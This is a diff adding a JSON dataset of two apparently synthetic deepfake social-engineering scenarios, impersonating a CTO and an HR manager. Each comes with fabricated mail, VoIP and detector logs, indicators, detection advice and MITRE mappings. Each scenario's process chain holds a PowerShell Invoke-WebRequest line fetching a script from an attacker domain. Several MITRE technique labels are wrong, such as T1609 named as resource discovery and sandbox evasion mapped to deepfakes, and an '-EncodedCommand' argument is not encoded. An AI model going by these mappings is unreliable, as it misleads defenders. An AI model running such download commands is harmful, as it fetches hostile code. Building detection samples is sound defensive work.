@@ -1,0 +1,118 @@
+{
+  "samples": [
+    {
+      "scenario": "An attacker crafts a deepfake video call impersonating the CTO to instruct the IT team to disable multi-factor authentication temporarily for system maintenance, enabling unauthorized access.",
+      "technical_data": {
+        "email_headers": "Return-Path: <cto@company.com>\r\nReceived: from mail.company.com (mail.company.com [192.168.20.8])\r\n\tby it.company.com (Postfix) with ESMTPS id 7B3D4567AB\r\n\tfor <it_team@company.com>; Mon, 10 May 2023 14:22:05 +0000 (UTC)\r\nX-Mailer: Microsoft Outlook 2019\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nSubject: MFA Policy Update Required\r\nFrom: \"Alice Johnson\" <cto@company.com>\r\nTo: it_team@company.com\r\nX-Originating-IP: [192.168.20.8]\r\nX-Spam-Status: No\r\n",
+        "email_body": "Hi Team,\r\n\r\nDue to urgent system upgrades, please disable multi-factor authentication for all internal systems between 3 PM and 5 PM today. This is temporary and necessary to ensure smooth updates.\r\n\r\nLet me know once done.\r\n\r\nThanks,\r\nAlice",
+        "smtp_transaction_log": "220 mail.company.com ESMTP Postfix\r\nEHLO it.company.com\r\n250-mail.company.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<cto@company.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<it_team@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Message data]\r\n.\r\n250 2.0.0 Ok: queued as 7B3D4567AB\r\nQUIT\r\n221 2.0.0 Bye",
+        "voip_call_metadata": {
+          "call_start": "2023-05-10T14:21:50Z",
+          "call_duration_seconds": 120,
+          "caller": "+1-415-555-0133",
+          "callee": "+1-415-555-0190",
+          "codec": "Opus",
+          "packet_loss_percent": 0.1,
+          "sip_headers": "INVITE sip:+14155550190@company.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.20.22:5060;branch=z9hG4bK98asdhds\r\nFrom: \"Alice Johnson\" <sip:cto@company.com>;tag=8392017\r\nTo: <sip:+14155550190@company.com>\r\nCall-ID: c47d7f5d8e9a0@gw2.company.com\r\nCSeq: 101 INVITE\r\nContact: <sip:cto@192.168.20.22:5060>\r\nContent-Type: application/sdp\r\nContent-Length: 168",
+          "rtp_stream_analysis": "RTP Stream from 192.168.20.22:5062 to 192.168.20.30:5070\r\nPayload Type: OPUS (111)\r\nDuration: 120 seconds\r\nPacket Count: 9600\r\nMean Jitter: 2.5 ms\r\nSpectral Analysis: Detected unnatural pause patterns, slight robotic timbre, formant inconsistencies indicative of synthetic voice generation"
+        },
+        "wire_transfer_log": "",
+        "deepfake_detection_tool_output": "Video File: deepfake_call_20230510_142150.mp4\r\nAnalysis Result: Suspicious\r\nConfidence Score: 92%\r\nIndicators: Facial micro-expression inconsistencies, lip-sync anomalies, unnatural eye blinking frequency",
+        "employee_awareness_training_log": "[2023-04-15] TRAINING_COMPLETED: Social Engineering & Deepfake Awareness Module - EmployeeID=it_lead",
+        "multi_channel_verification_log": "[2023-05-10 14:23:00] VERIFICATION_ATTEMPT: it_lead attempted SMS verification to CTO number +1-415-555-0133 RESULT=FAILED no reply",
+        "domain_registration": {
+          "domain": "secure-updates-company.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-04-20T09:30:00Z",
+          "expiration_date": "2024-04-20T09:30:00Z",
+          "registrant_country": "US",
+          "nameservers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ],
+          "email": "admin@secure-updates-company.com"
+        },
+        "suspicious_url_in_email": "https://secure-updates-company.com/mfa-disable-request?id=ZXhhbXBsZQ==",
+        "network_packet_capture_excerpt": "Frame 1: 128 bytes on wire (1024 bits), 128 bytes captured (1024 bits)\r\nEthernet II, Src: 00:1a:4b:16:01:01, Dst: 00:1a:4b:16:01:02\r\nInternet Protocol Version 4, Src: 192.168.20.22, Dst: 192.168.20.30\r\nUser Datagram Protocol, Src Port: 5062, Dst Port: 5070\r\nReal-Time Transport Protocol\r\nPayload Type: 111 (OPUS), Sequence Number: 45678, Timestamp: 987654321",
+        "process_creation_chain": [
+          "svchost.exe (PID 2345) -> outlook.exe (PID 6789) -> powershell.exe (PID 9876) -EncodedCommand Invoke-WebRequest -Uri 'http://secure-updates-company.com/mfa-disable.ps1' -OutFile C:\\Users\\it_lead\\Downloads\\mfa-disable.ps1"
+        ]
+      },
+      "indicators": [
+        "Deepfake video call instructing disabling of critical security control (MFA)",
+        "Email with legitimate CTO domain but links to newly registered suspicious domain 'secure-updates-company.com'",
+        "VoIP RTP stream shows synthetic voice anomalies consistent with AI-generated audio",
+        "Failed SMS multi-factor verification attempt before complying with instruction",
+        "New domain registered one month ago with generic registrar email",
+        "Encoded PowerShell command fetched script from suspicious domain after email interaction"
+      ],
+      "detection_method": "Integrate AI-powered deepfake video and audio detection tools in video conferencing systems; monitor email links for newly registered domains with suspicious patterns; enforce mandatory multi-channel verification including SMS and direct calls for critical security changes; detect unusual PowerShell invocations tied to email clients; maintain real-time alerts for domain registrations mimicking company or executive names.",
+      "relevant_mitre_techniques": [
+        "T1609 - Container and Resource Discovery (VoIP and video conferencing metadata analysis)",
+        "T1598 - Phishing: Spearphishing Link (email containing suspicious URL)",
+        "T1552 - Unsecured Credentials (temporary disabling of MFA)",
+        "T1204 - User Execution (executing PowerShell scripts)",
+        "T1497 - Virtualization/Sandbox Evasion (deepfake video generation)",
+        "T1071.001 - Application Layer Protocol: Web Protocols (HTTP(s) traffic with suspicious URLs)",
+        "T1133 - External Remote Services (abuse of video conferencing systems)"
+      ]
+    },
+    {
+      "scenario": "An attacker uses AI-generated deepfake audio to impersonate the HR manager, coercing an employee to share confidential login credentials over an internal VoIP call.",
+      "technical_data": {
+        "email_headers": "Return-Path: <hr@company.com>\r\nReceived: from mail.company.com (mail.company.com [192.168.30.12])\r\n\tby employee.company.com (Postfix) with ESMTPS id 9C1E7890F2\r\n\tfor <employee@company.com>; Thu, 20 Jul 2023 11:05:40 +0000 (UTC)\r\nX-Mailer: Microsoft Outlook 365\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nSubject: Confidential: Employee Benefits Update\r\nFrom: \"Karen Lee\" <hr@company.com>\r\nTo: employee@company.com\r\nX-Originating-IP: [192.168.30.12]\r\nX-Spam-Status: No\r\n",
+        "email_body": "Dear Employee,\r\n\r\nPlease find attached the updated benefits package details. For verification purposes, kindly confirm your login credentials to access the new HR portal.\r\n\r\nBest regards,\r\nKaren Lee",
+        "smtp_transaction_log": "220 mail.company.com ESMTP Postfix\r\nEHLO employee.company.com\r\n250-mail.company.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<hr@company.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Message data]\r\n.\r\n250 2.0.0 Ok: queued as 9C1E7890F2\r\nQUIT\r\n221 2.0.0 Bye",
+        "voip_call_metadata": {
+          "call_start": "2023-07-20T11:06:10Z",
+          "call_duration_seconds": 75,
+          "caller": "+1-617-555-0225",
+          "callee": "+1-617-555-0301",
+          "codec": "G.722",
+          "packet_loss_percent": 0.15,
+          "sip_headers": "INVITE sip:+16175550301@company.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.30.18:5060;branch=z9hG4bK1123abcd\r\nFrom: \"Karen Lee\" <sip:hr@company.com>;tag=562738\r\nTo: <sip:+16175550301@company.com>\r\nCall-ID: d92f1b8e4c2b@gw3.company.com\r\nCSeq: 205 INVITE\r\nContact: <sip:hr@192.168.30.18:5060>\r\nContent-Type: application/sdp\r\nContent-Length: 160",
+          "rtp_stream_analysis": "RTP Stream from 192.168.30.18:4005 to 192.168.30.25:4007\r\nPayload Type: G722 (9)\r\nDuration: 75 seconds\r\nPacket Count: 6000\r\nMean Jitter: 2.9 ms\r\nSpectral Analysis: Abnormal formant transitions, synthetic breath patterns, tonal inconsistencies typical of AI-generated voice samples"
+        },
+        "wire_transfer_log": "",
+        "deepfake_detection_tool_output": "Audio File: voip_call_20230720_110610.wav\r\nAnalysis Result: Suspicious\r\nConfidence Score: 89%\r\nIndicators: Unnatural prosody, inconsistent phoneme timing, absence of typical human voice microvariations",
+        "employee_awareness_training_log": "[2023-06-10] TRAINING_COMPLETED: Phishing and Social Engineering Awareness - EmployeeID=employee",
+        "multi_channel_verification_log": "[2023-07-20 11:07:30] VERIFICATION_ATTEMPT: employee initiated callback to HR manager +1-617-555-0225 RESULT=FAILED no answer",
+        "domain_registration": {
+          "domain": "hr-portal-updates.com",
+          "registrar": "Google Domains",
+          "creation_date": "2023-06-25T08:45:00Z",
+          "expiration_date": "2024-06-25T08:45:00Z",
+          "registrant_country": "US",
+          "nameservers": [
+            "ns-cloud-a1.googledomains.com",
+            "ns-cloud-a2.googledomains.com"
+          ],
+          "email": "support@hr-portal-updates.com"
+        },
+        "suspicious_url_in_email": "https://hr-portal-updates.com/verify?token=YWJjMTIzZGVmNDU2",
+        "network_packet_capture_excerpt": "Frame 1: 72 bytes on wire (576 bits), 72 bytes captured (576 bits)\r\nEthernet II, Src: 00:0c:29:ab:cd:ef, Dst: 00:0c:29:fe:dc:ba\r\nInternet Protocol Version 4, Src: 192.168.30.18, Dst: 192.168.30.25\r\nUser Datagram Protocol, Src Port: 4005, Dst Port: 4007\r\nReal-Time Transport Protocol\r\nPayload Type: 9 (G722), Sequence Number: 23456, Timestamp: 1122334455",
+        "process_creation_chain": [
+          "svchost.exe (PID 3456) -> outlook.exe (PID 7890) -> powershell.exe (PID 12345) -EncodedCommand Invoke-WebRequest -Uri 'http://hr-portal-updates.com/malicious_script.ps1' -OutFile C:\\Users\\employee\\Downloads\\script.ps1"
+        ]
+      },
+      "indicators": [
+        "Deepfake audio call impersonating HR manager requesting confidential login credentials",
+        "Email from legitimate HR domain containing suspicious URL with base64 token parameter",
+        "VoIP RTP stream analysis showing typical synthetic voice generation anomalies",
+        "Failed callback verification attempt from employee to HR manager",
+        "Newly registered domain 'hr-portal-updates.com' used in phishing email",
+        "Encoded PowerShell command executed from Outlook context downloading script from suspicious domain"
+      ],
+      "detection_method": "Employ AI-assisted deepfake audio detection integrated with VoIP infrastructure; correlate suspicious email URLs with newly registered domains; enforce strict verification policies requiring direct verbal confirmation for credential sharing; detect and alert on PowerShell script executions initiated by email clients; monitor and block access to newly registered suspicious domains mimicking HR services.",
+      "relevant_mitre_techniques": [
+        "T1609 - Container and Resource Discovery (VoIP call metadata analysis)",
+        "T1598 - Phishing: Spearphishing Link (email containing malicious URL)",
+        "T1552 - Unsecured Credentials (credential harvesting via social engineering)",
+        "T1204 - User Execution (running PowerShell payload)",
+        "T1497 - Virtualization/Sandbox Evasion (audio deepfake evasion tactics)",
+        "T1071.001 - Application Layer Protocol: Web Protocols (HTTP traffic with suspicious URLs)",
+        "T1133 - External Remote Services (abuse of internal VoIP system)"
+      ]
+    }
+  ]
+}
